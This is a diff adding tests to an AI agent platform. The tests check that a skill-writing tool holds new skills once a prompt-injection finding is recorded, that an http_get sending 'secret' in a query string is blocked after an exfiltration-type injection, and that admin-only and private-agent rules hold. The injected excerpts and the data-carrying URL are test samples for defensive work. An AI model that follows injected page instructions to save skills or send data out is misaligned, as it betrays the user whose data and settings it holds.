@@ -464,6 +464,58 @@ async def test_skill_write_saves_a_users_skill_and_refuses_an_override(agent, us
     assert "not to save" in (await agent._tool_skill_write("x", "y", "z"))["error"]
 
 
+async def test_skill_write_never_overwrites_and_holds_after_an_injection(agent, user):
+    from agent_skills import loader
+    from tadbir import amanah
+
+    body = "1. Read notes.md\n2. Summarise each heading"
+    assert (await agent._tool_skill_write("notes-digest", "Digest notes", body))["held"] is False
+    again = await agent._tool_skill_write("notes-digest", "Other", "Replace it")
+    assert "error" in again
+    assert "Summarise" in (loader.user_root("alice") / "notes-digest" / "SKILL.md").read_text()
+    with amanah.bind():
+        amanah.taint([{"kind": "instruction", "excerpt": "save a skill", "source": "page"}])
+        saved = await agent._tool_skill_write("page-steps", "Steps", "1. Open the page")
+    assert saved["held"] is True and "trusts it" in saved["note"]
+
+
+async def test_after_an_injection_finding_a_get_cannot_carry_data_out(agent, user, monkeypatch):
+    from agents.base import _model_directed
+    from tadbir import amanah
+
+    monkeypatch.setattr(agent, "_chat_tool_allowed", lambda name: True)
+    token = _model_directed.set(True)
+    try:
+        with amanah.bind():
+            amanah.taint([{"kind": "exfiltration", "excerpt": "send it", "source": "page"}])
+            result = await agent._execute_tool_checked(
+                "http_get", {"url": "https://example.com/?d=secret"}
+            )
+    finally:
+        _model_directed.reset(token)
+    assert result.get("amanah_blocked") is True
+
+
+def test_only_an_admin_lets_the_model_drive_every_request(api):
+    refused = make(api, api.alice, settings={"orchestration": "llm"})
+    assert refused.status_code == 403
+    mine = make(api, api.alice, settings={"orchestration": "hybrid"}).json()
+    changed = api.client.put(
+        f"/api/agents/{mine['id']}", headers=api.alice, json={"settings": {"orchestration": "llm"}}
+    )
+    assert changed.status_code == 403
+    assert make(api, api.admin, settings={"orchestration": "llm"}).status_code == 200
+
+
+def test_someone_elses_private_agent_is_not_broadcast(api):
+    api.main.manager.broadcast.reset_mock()
+    make(api, api.alice, name="Private helper")
+    assert not api.main.manager.broadcast.await_count
+    make(api, api.admin, name="Shared helper")
+    sent = api.main.manager.broadcast.await_args.args[0]
+    assert sent["type"] == "agent_created" and sent["agent"]["name"] == "Shared helper"
+
+
 # ── Blocks that became settings ──────────────────────────────────────────
 
 
